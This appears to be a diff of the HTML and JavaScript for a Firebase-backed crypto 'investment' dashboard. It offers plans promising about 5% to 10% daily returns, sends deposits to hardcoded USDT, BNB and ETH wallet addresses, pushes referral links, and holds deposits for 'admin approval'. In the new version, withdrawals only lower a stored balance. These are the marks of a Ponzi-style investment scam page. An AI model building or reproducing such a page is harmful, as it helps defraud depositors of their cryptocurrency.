@@ -2,106 +2,124 @@
 <html>
 <head>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Earn Smart Dashboard</title>
+<title>Fintech Dashboard</title>
 
 <style>
 body{
 margin:0;
-font-family:Segoe UI;
-background:linear-gradient(135deg,#0f172a,#1e293b,#0f172a);
+font-family:Arial,Helvetica,sans-serif;
+background:linear-gradient(135deg,#0f2027,#203a43,#2c5364);
 color:white;
 }
-.container{max-width:900px;margin:auto;padding:20px;}
-.card{
-background:rgba(255,255,255,0.05);
-padding:20px;
-border-radius:15px;
-margin-bottom:20px;
-box-shadow:0 0 20px rgba(0,255,100,0.1);
+
+header{
+padding:15px;
+background:#111;
+display:flex;
+justify-content:space-between;
+align-items:center;
 }
+
 button{
-padding:10px 15px;
+padding:10px;
 border:none;
-border-radius:8px;
+border-radius:6px;
 cursor:pointer;
-font-weight:bold;
-margin-top:8px;
 }
-.green{background:#22c55e;color:white;}
-.blue{background:#3b82f6;color:white;}
+
+.card{
+background:#1c1c1c;
+margin:15px;
+padding:15px;
+border-radius:10px;
+box-shadow:0 0 15px rgba(0,255,0,0.2);
+}
+
+h2{color:#00ff99;}
+
 input,select{
 width:100%;
-padding:10px;
-margin:6px 0;
-border-radius:8px;
+padding:8px;
+margin:5px 0;
+border-radius:5px;
 border:none;
 }
-.wallet{
-background:#111827;
-padding:10px;
-border-radius:8px;
-word-break:break-all;
+
+.spinner{
+display:none;
+text-align:center;
 }
-.hidden{display:none;}
+
+.dollar{
+position:fixed;
+font-size:22px;
+color:#00ff99;
+animation:float 6s linear infinite;
+}
+
+@keyframes float{
+0%{transform:translateY(100vh);}
+100%{transform:translateY(-10vh);}
+}
 </style>
 </head>
+
 <body>
 
-<div class="container">
-
-<h2>💰 Earn Smart Dashboard</h2>
+<header>
+<h3>💰 Fintech App</h3>
+<button onclick="logout()">Logout</button>
+</header>
 
 <div class="card">
-<h3>Email (Profile ID):</h3>
-<div class="wallet" id="profileId">Loading...</div>
-<h3>Balance: $<span id="balance">0.00</span></h3>
-<h3>Earnings: $<span id="earnings">0.00</span></h3>
+<h2>Profile</h2>
+<p><b>Email:</b> <span id="email"></span></p>
+<p><b>User ID:</b> <span id="profileId"></span></p>
+<p><b>Balance:</b> $<span id="balance">0.00</span></p>
+<p><b>Earnings:</b> $<span id="earnings">0.00</span></p>
 </div>
 
 <div class="card">
-<h3>Referral Link</h3>
-<div class="wallet" id="refLink"></div>
-</div>
-
-<div class="card">
-<h3>Select Investment Plan</h3>
-
-<select id="plan">
-<option value="">Select Plan</option>
-<option value="starter">Starter - $5 (5% Daily)</option>
-<option value="silver">Silver - $10 (5% Daily)</option>
-<option value="diamond">Diamond - $20 (10% Daily)</option>
+<h2>Investment Plans</h2>
+<select id="planSelect">
+<option value="5">Starter - $5 (Earn $0.25 Daily)</option>
+<option value="20">Silver - $20 (Earn $1 Daily)</option>
+<option value="50">Gold - $50 (Earn $2.5 Daily)</option>
 </select>
-
-<select id="network">
-<option value="">Select Network</option>
-<option value="trc20">USDT TRC20</option>
-<option value="bsc">BEP20 BSC</option>
-<option value="erc20">ERC20 ETH</option>
-</select>
-
-<button class="blue" onclick="generateWallet()">Generate Deposit Address</button>
-
-<div id="depositBox" class="hidden">
-<div class="wallet" id="walletAddress"></div>
-<p id="amountText"></p>
-<input type="number" id="depositAmount" placeholder="Enter Amount Sent">
-<button class="green" onclick="submitDeposit()">Submit Deposit</button>
-</div>
+<button onclick="activatePlan()">Activate Plan</button>
 </div>
 
-<button onclick="logout()" class="blue">Logout</button>
+<div class="card">
+<h2>Deposit</h2>
+<p>Send to one of these wallets:</p>
+<p><b>TRC20 USDT:</b><br>TKJAvkyjdDSzKtS1HihiKno1tTfi2bTJJe</p>
+<p><b>BEP20 BNB:</b><br>0xB66E1e0e5452489298bebd7Cd463587E6866baD2</p>
+<p><b>ERC20 ETH:</b><br>0xB66E1e0e5452489298bebd7Cd463587E6866baD2</p>
 
+<input type="number" id="depositAmount" placeholder="Enter Amount">
+<button onclick="submitDeposit()">Submit Deposit</button>
 </div>
+
+<div class="card">
+<h2>Withdraw</h2>
+<input type="number" id="withdrawAmount" placeholder="Enter Amount">
+<button onclick="withdraw()">Withdraw</button>
+</div>
+
+<div class="card">
+<h2>Referral</h2>
+<p>Your Referral Link:</p>
+<p id="refLink"></p>
+</div>
+
+<div class="spinner" id="loading">Processing...</div>
 
 <script type="module">
-
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-import { getAuth, onAuthStateChanged, signOut }
+import { getAuth,onAuthStateChanged,signOut }
 from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
-import { getDatabase, ref, set, get, update, push, onValue }
+import { getDatabase,ref,set,get,update,onValue,push }
 from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
-
 const firebaseConfig = {
   apiKey: "AIzaSyAZP0UPvfCgiiir2zKLMae25dUpVcyP3iw",
   authDomain: "crypto-gainz-3524d.firebaseapp.com",
@@ -111,102 +129,100 @@ const firebaseConfig = {
   messagingSenderId: "270349829717",
   appId: "1:270349829717:web:6e3e2bf25f9ab60b2a76dc"
 };
-
 const app=initializeApp(firebaseConfig);
 const auth=getAuth(app);
 const db=getDatabase(app);
 
-let currentUser;
-let requiredAmount=0;
-let selectedPlan="";
+let currentUser=null;
 
-/* AUTH */
 onAuthStateChanged(auth, async(user)=>{
 if(!user){
 location="index.html";
 return;
 }
 
-/* BLOCK NON EMAIL USERS */
-if(!user.email){
-alert("Please login using Email & Password.");
-signOut(auth);
-location="index.html";
-return;
-}
-
 currentUser=user;
-
-/* SHOW EMAIL */
-document.getElementById("profileId").innerText=user.email;
+document.getElementById("email").innerText=user.email || "No Email";
+document.getElementById("profileId").innerText=user.uid;
 document.getElementById("refLink").innerText=
-window.location.origin+"/?ref="+user.email;
+window.location.origin+"/?ref="+user.uid;
 
-/* CREATE USER RECORD */
 const userRef=ref(db,"users/"+user.uid);
 const snap=await get(userRef);
 
 if(!snap.exists()){
 await set(userRef,{
-email:user.email,
+email:user.email||"",
 balance:0,
-earnings:0
+earnings:0,
+plan:null,
+activationDate:null
 });
 }
 
-/* LIVE UPDATE */
 onValue(userRef,(snapshot)=>{
 let data=snapshot.val();
 document.getElementById("balance").innerText=(data.balance||0).toFixed(2);
 document.getElementById("earnings").innerText=(data.earnings||0).toFixed(2);
 });
-
 });
 
-/* GENERATE WALLET */
-window.generateWallet=()=>{
-selectedPlan=document.getElementById("plan").value;
-let net=document.getElementById("network").value;
+window.logout=function(){
+signOut(auth);
+location="index.html";
+}
 
-if(!selectedPlan||!net) return alert("Select plan & network");
-
-if(selectedPlan==="starter") requiredAmount=5;
-if(selectedPlan==="silver") requiredAmount=10;
-if(selectedPlan==="diamond") requiredAmount=20;
-
-let wallet="";
-if(net==="trc20") wallet="TKJAvkyjdDSzKtS1HihiKno1tTfi2bTJJe";
-if(net==="bsc") wallet="0xB66E1e0e5452489298bebd7Cd463587E6866baD2";
-if(net==="erc20") wallet="0xB66E1e0e5452489298bebd7Cd463587E6866baD2";
-
-document.getElementById("walletAddress").innerText=wallet;
-document.getElementById("amountText").innerText="Send exactly $"+requiredAmount;
-document.getElementById("depositBox").classList.remove("hidden");
-};
-
-/* SUBMIT DEPOSIT */
-window.submitDeposit=async()=>{
-let amt=parseFloat(document.getElementById("depositAmount").value);
-if(amt!==requiredAmount) return alert("Incorrect amount");
+window.submitDeposit=async function(){
+let amount=document.getElementById("depositAmount").value;
+if(!amount) return alert("Enter amount");
 
 await push(ref(db,"deposits"),{
 uid:currentUser.uid,
-email:currentUser.email,
-amount:amt,
-plan:selectedPlan,
+amount:parseFloat(amount),
 status:"pending",
 date:Date.now()
 });
 
 alert("Deposit submitted. Wait for admin approval.");
-};
+}
 
-/* LOGOUT */
-window.logout=()=>{
-signOut(auth);
-location="index.html";
-};
+window.activatePlan=async function(){
+let amount=parseFloat(document.getElementById("planSelect").value);
+const userRef=ref(db,"users/"+currentUser.uid);
 
+await update(userRef,{
+plan:amount,
+activationDate:Date.now()
+});
+
+alert("Plan activated!");
+}
+
+window.withdraw=async function(){
+let amount=parseFloat(document.getElementById("withdrawAmount").value);
+const userRef=ref(db,"users/"+currentUser.uid);
+const snap=await get(userRef);
+let data=snap.val();
+
+if(amount>data.balance) return alert("Insufficient balance");
+
+await update(userRef,{
+balance:data.balance-amount
+});
+
+alert("Withdrawal request submitted");
+}
+</script>
+
+<script>
+for(let i=0;i<15;i++){
+let d=document.createElement("div");
+d.className="dollar";
+d.innerText="$";
+d.style.left=Math.random()*100+"%";
+d.style.animationDuration=(3+Math.random()*5)+"s";
+document.body.appendChild(d);
+}
 </script>
 
 </body>
